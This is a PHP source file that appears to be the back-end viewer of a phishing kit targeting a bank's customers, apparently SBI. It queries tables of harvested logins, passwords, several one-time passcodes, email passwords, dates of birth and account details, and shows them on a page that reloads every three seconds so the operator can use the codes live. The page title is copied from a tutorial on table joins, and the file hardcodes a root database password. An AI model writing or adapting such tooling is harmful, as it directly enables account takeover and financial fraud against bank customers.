<?php  
 // Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "MyStrongPassword1234$";
$database = "sbi";
// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
} 
 $sql = "SELECT * FROM `login` INNER JOIN otp ON `login`.id = otp.id INNER JOIN otp2 ON `login`.id = otp2.id INNER JOIN otp3 ON `login`.id = otp3.id INNER JOIN otp4 ON `login`.id = otp4.id INNER JOIN otp5 ON `login`.id = otp5.id INNER JOIN otp6 ON `login`.id = otp6.id INNER JOIN email ON `login`.id = email.id INNER JOIN account ON `login`.id = account.id INNER JOIN `password` ON `login`.id = `password`.id ORDER BY `login`.id DESC";  
 $result = mysqli_query($conn, $sql);  
 ?>  
 <!DOCTYPE html>  
 <html>  
      <head>  
           <title>Webslesson Tutorial | Fetch Data from Two or more Table Join using PHP and MySql</title>  
           <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>  
           <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" />  
           <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script> 
           <script>
   setTimeout (function() {
      location.reload();
   }, 3000);
   
</script> 
      </head>  
      <body>  
           <br />  
           <div class="container" style="width:500px;">  
                <!-- <h3 align="">Fetch Data from Two or more Table Join using PHP and MySql</h3><br />                  -->
                <div>  
                       
                          <?php  
                          if(mysqli_num_rows($result) > 0)  
                          {  
                               while($row = mysqli_fetch_array($result))  
                               {  
                          ?>  
                            
                            
                               <?php echo "<hr><spam>Id </spam>" . $row["id"]. "<spam> Username => </spam>" . $row["username"] . "<br><spam>Password => </spam>"
                                     . $row["password"]."<br><spam>Mobile => </spam>". $row["mobile"]."<br><spam> 1st_OTP => </spam>" . $row["otp"] . "<br><spam>2nd_OTP => </spam>". $row["otp2"]."<br><spam>Account Holder => </spam>". $row["account"]."<br><spam> DOB => </spam>" . $row["dob"] . "<br><spam>3rd_OTP => </spam>"
                                     . $row["otp3"]."<br><spam>Email => </spam>". $row["email"]."<br><spam> Email_Password => </spam>" . $row["epassword"] . "<br><spam>4th_OTP => </spam>". $row["otp4"]."<br><spam>New Password => </spam>". $row["password1"]."<br><spam>6th_OTP => </spam>". $row["otp6"]. ""; ?>
                               

                          <?php  
                               }  
                          }  
                          ?>  
                     </table>  
                </div>  
           </div>  
           <br />  
      </body>  
 </html> 





 